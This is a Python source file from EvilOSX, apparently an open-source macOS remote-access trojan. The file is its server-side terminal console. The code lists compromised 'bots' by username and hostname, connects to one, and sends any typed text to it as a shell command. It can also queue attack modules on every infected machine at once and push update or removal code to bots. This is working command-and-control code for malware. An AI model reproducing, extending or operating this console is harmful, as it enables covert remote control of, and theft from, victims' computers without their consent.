# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from threading import Lock, current_thread
from threading import Thread
from time import strftime, localtime

import urwid
from queue import Queue

from bot import loaders
from server import modules
from server.model import Command, CommandType
from server.modules.helper import ModuleViewABC
from server.version import VERSION
from server.view.helper import *


class _OutputView:
    """This class shows the command output view."""

    def __init__(self, max_size=69):
        self._max_size = max_size

        self._output_view = urwid.ListBox(urwid.SimpleListWalker([]))
        self._lock = Lock()

        self._main_loop = None

    def get(self):
        """
        :rtype: urwid.ListBox
        """
        return self._output_view

    def set_main_loop(self, main_loop):
        self._main_loop = main_loop

    def add(self, line, prefix=""):
        """
        :type line: str
        :type prefix: str
        """
        with self._lock:
            was_on_end = self._output_view.get_focus()[1] == len(self._output_view.body) - 1

            if len(self._output_view.body) > self._max_size:
                # Size limit reached, delete the first line.
                del self._output_view.body[0]

            if prefix == "info":
                self._output_view.body.append(urwid.Text([('normal', "["), ('info', "I"), ("normal", "] " + line)]))
            elif prefix == "input":
                self._output_view.body.append(urwid.Text([('normal', "["), ('reversed', "?"), ("normal", "] " + line)]))
            elif prefix == "attention":
                self._output_view.body.append(
                    urwid.Text([('normal', "["), ('attention', "!"), ("normal", "] " + line)]))
            else:
                self._output_view.body.append(urwid.Text(line))

            if was_on_end:
                self._output_view.set_focus(len(self._output_view.body) - 1, "above")

            self._async_reload()

    def clear(self):
        with self._lock:
            del self._output_view.body[:]
            self._async_reload()

    def _async_reload(self):
        # Required if this method is called from a different thread asynchronously.
        if self._main_loop and self._main_loop != current_thread():
            self._main_loop.draw_screen()


class _CommandInput(urwid.Pile):
    """This class shows the command input view."""
    signals = ["line_entered"]

    def __init__(self):
        self._header = urwid.Text("Command: ")
        self._edit_box = urwid.Edit()
        self._output_list = urwid.ListBox(urwid.SimpleFocusListWalker([]))
        self._output_layout = urwid.BoxAdapter(self._output_list, 0)  # Dynamically change size.

        self._lock = Lock()
        self._prompt_mode = False
        self._prompt_queue = Queue()

        self._main_loop = None

        urwid.Pile.__init__(self, [
            urwid.AttrWrap(self._header, "reversed"),
            self._output_layout,
            self._edit_box
        ])

        self.focus_item = self._edit_box

    def set_main_loop(self, main_loop):
        self._main_loop = main_loop

    def set_header_text(self, text):
        """
        :type text: str
        """
        with self._lock:
            self._header.set_text(text)
            self._async_reload()

    def add(self, line, prefix=""):
        """"
        :type line: str
        :type prefix: str
        """
        with self._lock:
            # Set the height of the output list so the line is actually visible.
            self._output_layout.height = len(self._output_list.body) + 1

            if prefix == "info":
                self._output_list.body.append(urwid.Text([("normal", "["), ("info", "I"), ("normal", "] " + line)]))
            elif prefix == "input":
                self._output_list.body.append(urwid.Text("[?] " + line))
            elif prefix == "attention":
                self._output_list.body.append(
                    urwid.Text([("normal", "["), ("attention", "!"), ("normal", "] " + line)]))
            else:
                self._output_list.body.append(urwid.Text(line))

            self._async_reload()

    def clear(self):
        with self._lock:
            del self._output_list.body[:]
            self._output_layout.height = 0
            self._async_reload()

    def get_prompt_input(self):
        """
        :rtype: str
        """
        self._prompt_mode = True

        # Wait for user input.
        return self._prompt_queue.get()

    def keypress(self, size, key):
        if key == "enter":
            command = self._edit_box.edit_text

            if self._prompt_mode:
                # We're in prompt mode, return the value
                # to the queue which unblocks the prompt method.
                self._prompt_queue.put(command)
                self._prompt_mode = False
                self.clear()
            else:
                # Normal mode, call listeners.
                urwid.emit_signal(self, "line_entered", command)

            self._edit_box.edit_text = ""
        else:
            urwid.Edit.keypress(self._edit_box, size, key)

    def _async_reload(self):
        # Required if this method is called from a different thread asynchronously.
        if self._main_loop and self._main_loop != current_thread():
            self._main_loop.draw_screen()


class _ModuleView(ModuleViewABC):
    """Class which allows modules to interact with the view."""

    def __init__(self, view):
        self._view = view

    def display_error(self, message):
        """
        :type message: str
        """
        self._view.output(message, "attention")

    def display_info(self, message):
        """
        :type message: str
        """
        self._view.output(message, "info")

    def should_continue(self, messages):
        """
        :type messages: list[str]
        :rtype: bool
        """
        lines = []

        for message in messages:
            lines.append((message, ""))

        confirm = self._view.prompt("Are you sure you want to continue? [Y/n]", lines).lower()

        if not confirm or confirm == "y":
            return True
        else:
            return False

    def output(self, line, prefix=""):
        """
        :type line: str
        :type prefix: str
        """
        self._view.output(line, prefix)


class ViewCLI(ViewABC):
    """This class interacts with the user via a command line interface.

    The controller will register all listeners (set_on_*) for this view.
    """

    def __init__(self, model, server_port):
        self._model = model
        self._server_port = server_port

        self._PALETTE = [
            ("reversed", urwid.BLACK, urwid.LIGHT_GRAY),
            ("normal", urwid.LIGHT_GRAY, urwid.BLACK),
            ("info", urwid.LIGHT_BLUE, urwid.BLACK),
            ("attention", urwid.LIGHT_RED, urwid.BLACK)
        ]

        self._header = urwid.Text("")
        self._output_view = _OutputView()
        self._command_input = _CommandInput()

        self._main_loop = None
        self._connected_bot = None

        self.set_window_title("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, server_port))
        self.output("Server started, waiting for connections...", "info")
        self.output("Type \"help\" to show the help menu.", "info")

        # http://urwid.org/reference/signals.html
        urwid.connect_signal(self._command_input, "line_entered", self._process_command)

        # Initialize the frame.
        self._frame = urwid.Frame(
            header=urwid.AttrWrap(self._header, "reversed"),
            body=self._output_view.get(),
            footer=self._command_input
        )

        self._frame.set_focus_path(["footer", 2])

    def output(self, line, prefix=""):
        """
        :type line: str
        :type prefix: str
        """
        self._output_view.add(line, prefix)

    def on_response(self, response):
        """
        :type response: str
        """
        self.output_separator()

        for line in response.splitlines():
            self.output(line)

    def on_bot_added(self, bot):
        """
        :type bot: Bot
        """
        self.set_window_title("EvilOSX v{} | Port: {} | Available bots: {}".format(
            VERSION, self._server_port, self._model.get_bot_amount()
        ))

    def on_bot_removed(self, bot):
        """
        :type bot: Bot
        """
        self.set_window_title("EvilOSX v{} | Port: {} | Available bots: {}".format(
            VERSION, self._server_port, self._model.get_bot_amount()
        ))

    def on_bot_path_change(self, bot):
        """
        :type bot: Bot
        """
        self.set_footer_text("Command ({}@{}, {}): ".format(
            bot.username, bot.hostname, bot.local_path
        ))

    def prompt(self, prompt_text, lines=None):
        """
        :type prompt_text: str
        :type lines: list or None
        :rtype: str
        """
        if lines:
            for line in lines:
                self._command_input.add(*line)
        self._command_input.add(prompt_text, "input")

        return self._command_input.get_prompt_input()

    def _process_command(self, command):
        """
        :type command: str
        """
        if command.strip() == "":
            return

        self.output_separator()

        if command == "help":
            self.output("Commands other than the ones listed below will be run on the connected "
                        "bot as a shell command.", "attention")
            self.output("help                 -  Show this help menu.")
            self.output("bots                 -  Show the amount of available bots.")
            self.output("connect <id>         -  Start interacting with the bot (required before using \"use\").")
            self.output("modules              -  Show a list of available modules.")
            self.output("use <module_name>    -  Run the module on the connected bot.")
            self.output("stop <module_name>   -  Ask the module to stop executing.")
            self.output("useall <module_name> -  Set the module which will be run on every bot.")
            self.output("stopall              -  Clear the globally set module.")
            self.output("clear                -  Clear the screen.")
            self.output("exit/q/quit          -  Close the server and exit.")
        elif command.startswith("bots"):
            if command == "bots":
                bots = self._model.get_bots(limit=10)

                if not bots:
                    self.output("There are no available bots.", "attention")
                else:
                    self.output("No page specified, showing the first page.", "info")
                    self.output("Use \"bots <page>\" to see a different page (each page is 10 results).", "info")

                    for i, bot in enumerate(self._model.get_bots(limit=10)):
                        self.output("{} = \"{}@{}\" (last seen: {})".format(
                            str(i), bot.username, bot.hostname,
                            strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
                        ))
            else:
                try:
                    # Show the bots of the given "page".
                    page_number = int(command.split(" ")[1])

                    if page_number <= 0:
                        page_number = 1

                    skip_amount = (page_number * 10) - 10
                    bots = self._model.get_bots(limit=10, skip_amount=skip_amount)

                    if not bots:
                        self.output("There are no available bots on this page.", "attention")
                    else:
                        self.output("Showing bots on page {}.".format(page_number), "info")

                        for i, bot in enumerate(bots):
                            self.output("{} = \"{}@{}\" (last seen: {})".format(
                                str(i), bot.username, bot.hostname,
                                strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
                            ))
                except ValueError:
                    self.output("Invalid page number.", "attention")
        elif command.startswith("connect"):
            try:
                specified_id = int(command.split(" ")[1])
                self._connected_bot = self._model.get_bots()[specified_id]

                self.output("Connected to \"%s@%s\", ready to send commands." % (
                    self._connected_bot.username, self._connected_bot.hostname
                ), "info")
                self.set_footer_text("Command ({}@{}, {}): ".format(
                    self._connected_bot.username, self._connected_bot.hostname, self._connected_bot.local_path
                ))
            except (IndexError, ValueError):
                self.output("Invalid bot ID (see \"bots\").", "attention")
                self.output("Usage: connect <ID>", "attention")
        elif command == "modules":
            self.output("Type \"use <module_name>\" to use a module.", "info")

            for module_name in modules.get_names():
                try:
                    module = modules.get_module(module_name)

                    if not module:
                        module_view = _ModuleView(self)
                        module = modules.load_module(module_name, module_view, self._model)

                    self.output("{:16} -  {}".format(module_name, module.get_info()["Description"]))
                except AttributeError as ex:
                    self.output(str(ex), "attention")
        elif command.startswith("useall"):
            if command == "useall":
                self.output("Usage: useall <module_name>", "attention")
                self.output("Type \"modules\" to get a list of available modules.", "attention")
            else:
                module_name = command.split(" ")[1]

                module_thread = Thread(target=self._run_module, args=(module_name, True))
                module_thread.daemon = True
                module_thread.start()
        elif command == "clear":
            self.clear()
        elif command in ["exit", "q", "quit"]:
            raise urwid.ExitMainLoop()
        else:
            # Commands that require a connected bot.
            if not self._connected_bot:
                self.output("You must be connected to a bot to perform this action.", "attention")
                self.output("Type \"connect <ID>\" to connect to a bot.", "attention")
            else:
                if command.startswith("use"):
                    if command == "use":
                        self.output("Usage: use <module_name>", "attention")
                        self.output("Type \"modules\" to get a list of available modules.", "attention")
                    else:
                        module_name = command.split(" ")[1]

                        module_thread = Thread(target=self._run_module, args=(module_name,))
                        module_thread.daemon = True
                        module_thread.start()
                else:
                    # Regular shell command.
                    self.output("Executing command: {}".format(command), "info")
                    self._model.add_command(self._connected_bot.uid, Command(CommandType.SHELL, command.encode()))

    def _run_module(self, module_name, mass_execute=False):
        """Setup then run the module, required because otherwise calls to prompt block the main thread."""
        try:
            module = modules.get_module(module_name)
            code = ("", b"")

            if not module:
                module_view = _ModuleView(self)
                module = modules.load_module(module_name, module_view, self._model)

            set_options = []

            for setup_message in module.get_setup_messages():
                set_options.append(self.prompt(setup_message))

            successful, options = module.setup(set_options)

            if not successful:
                self.output("Module setup failed or cancelled.", "attention")
            else:
                if not options:
                    options = {}

                options["module_name"] = module_name

                if mass_execute:
                    bots = self._model.get_bots()

                    for bot in bots:
                        if module_name == "remove_bot":
                            if code[0] != bot.loader_name:
                                code = (bot.loader_name, loaders.get_remove_code(bot.loader_name))
                        elif module_name == "update_bot":
                            if code[0] != bot.loader_name:
                                code = (bot.loader_name, loaders.get_update_code(bot.loader_name))
                        else:
                            if not code[0]:
                                code = ("", modules.get_code(module_name))

                        self._model.add_command(bot.uid, Command(
                            CommandType.MODULE, code[1], options
                        ))

                    self.output("Module added to the queue of {} bot(s).".format(len(bots)), "info")
                else:
                    if module_name == "remove_bot":
                        code = loaders.get_remove_code(self._connected_bot.loader_name)
                    elif module_name == "update_bot":
                        code = loaders.get_update_code(self._connected_bot.loader_name)
                    else:
                        code = modules.get_code(module_name)

                    self._model.add_command(self._connected_bot.uid, Command(
                        CommandType.MODULE, code, options
                    ))

                    self.output("Module added to the queue of \"{}@{}\".".format(
                        self._connected_bot.username, self._connected_bot.hostname
                    ), "info")
        except ImportError:
            self.output("Failed to find module: {}".format(module_name), "attention")
            self.output("Type \"modules\" to get a list of available modules.", "attention")

    def set_window_title(self, text):
        """
        :type text: str
        """
        self._header.set_text(text)
        self._async_reload()

    def set_footer_text(self, text):
        """
        :type text: str
        """
        self._command_input.set_header_text(text)

    def clear(self):
        self._output_view.clear()

    def start(self):
        main_loop = urwid.MainLoop(self._frame, self._PALETTE, handle_mouse=True)

        self._set_main_loop(main_loop)
        self._output_view.set_main_loop(main_loop)
        self._command_input.set_main_loop(main_loop)
        main_loop.run()

    def _set_main_loop(self, main_loop):
        self._main_loop = main_loop

    def _async_reload(self):
        # Required if this method is called from a different thread asynchronously.
        if self._main_loop and self._main_loop != current_thread():
            self._main_loop.draw_screen()
